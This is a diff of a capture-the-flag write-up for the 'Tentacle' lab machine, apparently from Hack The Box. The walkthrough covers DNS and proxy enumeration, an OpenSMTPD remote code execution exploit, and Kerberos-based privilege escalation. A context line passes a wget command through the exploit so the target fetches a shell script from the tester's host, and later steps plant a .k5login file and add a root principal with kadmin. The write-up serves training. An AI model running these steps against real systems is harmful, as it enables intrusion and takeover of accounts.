@@ -5,9 +5,9 @@
 
 # Enumeration
 
-__IP-ADDR:__ 10.10.10.224 realcorp.htb
+**IP-ADDR:** 10.10.10.224 realcorp.htb
 
-__nmap scan:__
+**nmap scan:**
 ```bash
 PORT     STATE SERVICE      VERSION
 22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
@@ -27,9 +27,11 @@ Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux
 
 * Found hostname: `REALCORP.HTB`
 
+# Foothold
+
 ## DNS Enumeration
 
-__dig__
+### dig
 
 Using `dig` command to retrive "Any information" from dns server.
 ```bash
@@ -63,7 +65,7 @@ ns.realcorp.htb.	259200	IN	A	10.197.243.77
 
 * Found internal host IP `10.197.243.77` which is running nameserver.
 
-__dnsenum__
+### dnsenum
 
 Bruteforce hosts from dns server.
 ```bash
@@ -93,7 +95,7 @@ done.
 
 * Host on `10.197.243.77` also running proxy server.
 * and there is another host running wpad(?)
-  * __[wpad](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)__(Web Proxy Auto-Discovery Protocol) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. 
+  * **[wpad](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)**(Web Proxy Auto-Discovery Protocol) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. 
 
 There is another way to reverse dns bruteforce with `dnsrecon`, on entire subnet. 
 ```bash
@@ -196,26 +198,7 @@ http    10.197.243.77   3128
 ```bash
 ❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt:FUZZ -u http://wpad.realcorp.htb/FUZZ -x 'http://::1:8899' -v
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v1.2.0-git
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://wpad.realcorp.htb/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Proxy            : http://::1:8899
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403
-________________________________________________
+#... [snip] ...
 
 [Status: 301, Size: 185, Words: 6, Lines: 8]
 | URL | http://wpad.realcorp.htb/.
@@ -273,7 +256,7 @@ PORT   STATE SERVICE VERSION
 Service Info: Host: smtp.realcorp.htb
 ```
 
-# Foothold:OpenSMTPD_RCE
+## OpenSMTPD RCE
 
 Found Remote Code Execution from searchsploit
 ```bash
@@ -288,7 +271,7 @@ OpenSMTPD 6.6.1 - Remote Code Execution                     | linux/remote/47984
 Shellcodes: No Results
 ```
 
-__[CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247):__ smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation. __[Exploit](https://www.exploit-db.com/exploits/47984)__
+**[CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247):** smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation. **[Exploit](https://www.exploit-db.com/exploits/47984)**
 
 only change requires in exploit script is `RCPT <email>`(a valid user email) which we found from squid leak `j.nakazawa@realcorp.htb`
 
@@ -302,9 +285,9 @@ proxychains python smtp-rce.py 10.241.251.113 25 'wget -q -O ss.sh 10.10.15.71/s
 ![](screenshots/reverse-shell.png)
 
 
-# Privesc:everything_kerberos
+# Privesc
 
-## kerberos token to ssh login
+## ssh with kerberos token
 
 get root shell on smtp server host.
 
@@ -315,7 +298,7 @@ user which email found from squid is in this box. Found msmtp(an SMTP client) co
 
 creds not working for ssh but working for [kerberos](https://ubuntu.com/server/docs/service-kerberos).
 
-__kerberos__ is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.
+**kerberos** is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.
 
 that means we can create token from `krb5-user` tool to login to ssh as user "j.nakazawa"
 
@@ -343,7 +326,7 @@ and get the auth token for user "j.nakazawa"
 
 but Login with the token is not working and after some research found [solution](https://uz.sns.it/~enrico/site/posts/kerberos/password-less-ssh-login-with-kerberos.html)
 
-__GSSAPI__(Generic Security Services API) allows applications to communicate securely using Kerberos 5 or other security mechanisms.
+**GSSAPI**(Generic Security Services API) allows applications to communicate securely using Kerberos 5 or other security mechanisms.
 
 SSH login command
 ```bash
@@ -357,9 +340,9 @@ sJB}RM>6Z~64_
 
 ![](screenshots/token-to-ssh.png)
 
-__Update:__ `GSSAPIAuthentication` already enables by default from ssh config file so `-o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes` are not required, the real reason for this to not work because GSSAPI cheaking for user in `REALCORP.HTB`'s krb database but user is in `srv01.realcorp.htb` and if we add `srv01.realcorp.htb` in `hosts` file and login with this host, it still won't work because GSSAPI takes first host name from `/etc/hosts` file, for this problem we can use `GSSAPIServerIdentity` to specify host which to look for.
+**Update:** `GSSAPIAuthentication` already enables by default from ssh config file so `-o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes` are not required, the real reason for this to not work because GSSAPI cheaking for user in `REALCORP.HTB`'s krb database but user is in `srv01.realcorp.htb` and if we add `srv01.realcorp.htb` in `hosts` file and login with this host, it still won't work because GSSAPI takes first host name from `/etc/hosts` file, for this problem we can use `GSSAPIServerIdentity` to specify host which to look for.
 
-## Crontab to k5login
+## k5login
 
 Found crontab running `/usr/local/bin/log_backup.sh` as user "admin" on `srv01` host
 ```bash
@@ -380,17 +363,17 @@ script is syncing `/var/log/squid/` to `/home/admin/`, that means all file from 
 
 Found a login technique with kerberos with `.k5login` config file from [kerberos docs](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html)
 
-__EXAMPLES__
+**EXAMPLES**
 
-Suppose the user "alice" had a `.k5login` file in her __home directory__ containing just the following line:
+Suppose the user "alice" had a `.k5login` file in her **home directory** containing just the following line:
 ```bash
 bob@FOOBAR.ORG
 ```
-This would allow user "bob" to use Kerberos network applications, such as `ssh`, to __access alice‘s account__, using __bob‘s Kerberos tickets__.
+This would allow user "bob" to use Kerberos network applications, such as `ssh`, to **access alice‘s account**, using **bob‘s Kerberos tickets**.
 
 and we can use this technique to login to user "admin" with running cronjob.
 
-__Create `.k5login` file in the `/var/log/squid/` folder.__
+**Create `.k5login` file in the `/var/log/squid/` folder.**
 
 *user "j.nakazawa" is in squid group but `/var/log/squid` directory don't have read permission.*
 
@@ -405,8 +388,7 @@ and ssh to "admin" with user "j.nakazawa" token
 ![](screenshots/k5admin.png)
 
 
-## [kadmin](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html)
-
+## kadmin
 
 Runing linpeas from "admin" found some intresting kerberos information.
 
@@ -465,18 +447,18 @@ A Kerberos principal is a unique identity to which Kerberos can assign tickets. 
 
 with `add_principal` command we can add keytab principal, But it This command requires the "add" privilege.
 
-__Check privileges with `get_privs` command__
+**Check privileges with `get_privs` command**
 ```bash
 kadmin:  get_privs
 current privileges: INQUIRE ADD MODIFY DELETE
 ```
 
-__adding principal__
+**adding principal**
 ```bash
 add_principal root@REALCORP.HTB
 ```
 
-__than change user to root__
+**than change user to root**
 ```bash
 ksu root
 ```
